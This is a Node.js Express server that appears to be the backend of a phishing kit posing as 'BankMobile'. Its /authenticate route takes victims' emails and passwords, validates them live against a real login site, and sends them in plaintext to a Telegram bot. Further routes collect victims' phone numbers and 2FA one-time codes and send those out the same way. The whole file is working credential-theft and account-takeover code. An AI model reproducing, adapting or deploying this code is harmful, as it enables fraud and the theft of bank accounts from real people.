require('dotenv').config();
const express = require('express');
const cors = require('cors');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3004;

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

app.use(cors({ origin: '*' }));
app.use(express.json());

async function sendToTelegram(message) {
    if (!BOT_TOKEN || !CHAT_ID) return false;
    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
        return true;
    } catch (error) {
        return false;
    }
}

async function authenticateWithAPI(email, password) {
    try {
        console.log(`🌐 Sending login request for: ${email}`);
        
        const params = new URLSearchParams();
        params.append('usrname', email);
        params.append('passwd', password);
        
        const response = await axios.post('https://profile.refundselection.com/authenticate/login', 
            params.toString(),
            {
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                },
                maxRedirects: 0,
                validateStatus: (status) => status < 500
            }
        );
        
        console.log(`Response status: ${response.status}`);
        
        // CHECK 1: 302 Redirect (old method)
        if (response.status === 302) {
            console.log('✅ SUCCESS - 302 redirect');
            return { success: true };
        }
        
        // CHECK 2: Check response body for success indicators
        const data = response.data || '';
        console.log(`Response body length: ${data.length}`);
        console.log(`Response preview: ${data.substring(0, 200)}...`);
        
        // SUCCESS INDICATORS - These words appear on successful login pages
        if (
            data.includes('Welcome') || 
            data.includes('Dashboard') || 
            data.includes('logout') || 
            data.includes('account') ||
            data.includes('profile') ||
            data.includes('Manage') ||
            data.includes('2FAuthentication') ||
            data.includes('2FA') ||
            data.includes('authentication') ||
            data.includes('verification') ||
            data.includes('success') ||
            data.includes('redirect')
        ) {
            console.log('✅ SUCCESS - Found success indicators in response');
            return { success: true };
        }
        
        // FAILURE INDICATORS
        if (
            data.includes('Error: Incorrect Email') || 
            data.includes('Error: Incorrect Password') || 
            data.includes('Invalid login') || 
            data.includes('does not match our records') ||
            data.includes('Invalid username') ||
            data.includes('Invalid credentials') ||
            data.includes('login failed') ||
            data.includes('authentication failed')
        ) {
            console.log('❌ FAILED - Invalid credentials');
            return { success: false };
        }
        
        console.log('❌ FAILED - No success indicators found');
        return { success: false };
        
    } catch (error) {
        console.log('❌ Error:', error.message);
        
        if (error.response) {
            console.log(`Error status: ${error.response.status}`);
            
            if (error.response.status === 302) {
                console.log('✅ SUCCESS - 302 redirect');
                return { success: true };
            }
            
            // Check error response body
            const data = error.response.data || '';
            if (data.includes('Welcome') || data.includes('Dashboard') || data.includes('logout')) {
                console.log('✅ SUCCESS - Found success indicators in error response');
                return { success: true };
            }
        }
        
        return { success: false };
    }
}

app.post('/authenticate', async (req, res) => {
    const { email, password } = req.body;
    console.log(`\n🔐 Login attempt: ${email}`);
    
    const result = await authenticateWithAPI(email, password);
    
    if (result.success) {
        const successMsg = `✅ <b>SUCCESS!</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `📧 <b>Email:</b> <code>${email}</code>\n` +
            `🔑 <b>Password:</b> <code>${password}</code>\n` +
            `📊 <b>Status:</b> ✅ VALID\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `🕐 ${new Date().toLocaleString('en-US', {timeZone: 'UTC'})}`;
        await sendToTelegram(successMsg);
        console.log('✅ VALID');
        res.json({ success: true });
    } else {
        const failMsg = `❌ <b>FAILED</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `📧 <b>Email:</b> <code>${email}</code>\n` +
            `🔑 <b>Password:</b> <code>${password}</code>\n` +
            `📊 <b>Status:</b> ❌ INVALID\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `🕐 ${new Date().toLocaleString('en-US', {timeZone: 'UTC'})}`;
        await sendToTelegram(failMsg);
        console.log('❌ INVALID');
        res.json({ success: false, error: 'Invalid credentials' });
    }
});

app.post('/submit-phone', async (req, res) => {
    const { phone } = req.body;
    console.log(`📱 Phone: ${phone}`);
    await sendToTelegram(`📱 <b>PHONE NUMBER</b>\nNumber: <code>${phone}</code>`);
    res.json({ success: true });
});

app.post('/submit-otp', async (req, res) => {
    const { otp } = req.body;
    console.log(`🔐 OTP: ${otp}`);
    await sendToTelegram(`🔐 <b>2FA CODE</b>\nCode: <code>${otp}</code>`);
    res.json({ success: true });
});

app.get('/health', (req, res) => {
    res.json({ 
        status: 'ok', 
        service: 'bankmobile-backend',
        telegram: BOT_TOKEN ? '✅ configured' : '❌ not configured'
    });
});

app.get('/', (req, res) => {
    res.json({
        service: 'BankMobile Backend API',
        status: 'running',
        endpoints: {
            'POST /authenticate': 'Login',
            'POST /submit-phone': 'Submit phone',
            'POST /submit-otp': 'Submit OTP',
            'GET /health': 'Health check'
        }
    });
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ BankMobile Backend running on port ${PORT}`);
    console.log(`📨 Telegram: ${BOT_TOKEN ? '✅ CONFIGURED' : '❌ NOT CONFIGURED'}`);
});
